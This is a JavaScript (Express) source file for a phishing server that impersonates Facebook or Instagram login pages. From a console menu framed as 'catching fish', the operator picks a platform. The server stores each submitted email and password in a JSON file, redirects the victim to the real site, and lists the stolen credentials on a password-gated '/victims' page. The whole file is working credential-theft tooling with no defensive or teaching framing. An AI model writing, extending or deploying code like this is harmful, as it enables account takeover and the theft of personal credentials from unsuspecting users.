const readline = require('readline');
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config(); // Load environment variables

const app = express();
const dbPath = path.join(__dirname, 'db.json');
app.use(express.static(path.join(__dirname, 'public')));


// Set the view engine
app.set('view engine', 'ejs');

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Define the mapping of options
const map = {
    1: 'Facebook',
    2: 'Instagram',
};

// Create an interface for input and output
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Function to display the menu
function displayMenu() {
    console.log('Fishes in the sea:');
    for (const key in map) {
        console.log(`${key}. ${map[key]}`);
    }
}

// Function to handle user selection
function handleSelection(selection) {
    if (map[selection]) {
        return map[selection];
    }
    return null;
}

// Function to move ahead with the selected platform
function moveAhead(platform) {
    // Route to render the login page based on the platform
    app.get('/', (req, res) => {
        res.render(platform.toLowerCase(), { platform });
    });

    // Route to handle form submission
    app.post('/store', (req, res) => {
        const { email, password } = req.body;

        // Read the existing data from db.json
        fs.readFile(dbPath, (err, data) => {
            if (err) {
                console.error('Error reading db.json:', err);
                return res.status(500).send('Internal Server Error');
            }

            let db;
            try {
                db = JSON.parse(data);
            } catch (e) {
                console.error('Error parsing db.json:', e);
                return res.status(500).send('Internal Server Error');
            }

            // Add new data with timestamp
            const timestamp = new Date().toISOString();
            db.push({ platform, email, password, timestamp });

            // Write the updated data back to db.json
            fs.writeFile(dbPath, JSON.stringify(db, null, 2), (err) => {
                if (err) {
                    console.error('Error writing to db.json:', err);
                    return res.status(500).send('Internal Server Error');
                }

                res.redirect(`https://www.${platform.toLowerCase()}.com`);
            });
        });
    });

}

app.get('/victims', (req, res) => {
    res.render('authentication');
});

// Route to handle password submission
app.post('/victims', (req, res) => {
    const { password } = req.body;

    // Check if the password matches the one in .env
    if (password === process.env.PASSWORD) {
        // Read the existing data from db.json
        fs.readFile(dbPath, (err, data) => {
            if (err) {
                console.error('Error reading db.json:', err);
                return res.status(500).send('Internal Server Error');
            }

            let db;
            try {
                db = JSON.parse(data);
            } catch (e) {
                console.error('Error parsing db.json:', e);
                return res.status(500).send('Internal Server Error');
            }

            res.render('victims', { db });
        });
    } else {
        res.status(403).send('Forbidden');
    }
});

// Function to prompt the user and handle input
function promptUser() {
    displayMenu();
    rl.question('Which fish shall we catch, Mr. Fisherman? ', (selection) => {
        const platform = handleSelection(selection);
        if (platform) {
            console.log(`Catching ${platform}`);
            moveAhead(platform);
        } else {
            console.log('Invalid selection. Please try again.');
            promptUser(); // Prompt again if invalid input
        }
        rl.close(); // Close the readline interface when done
    });
}

// Run the prompt and start the server
promptUser();

// Start the server
app.listen(3000, () => {
    console.log('Server started on port 3000');
});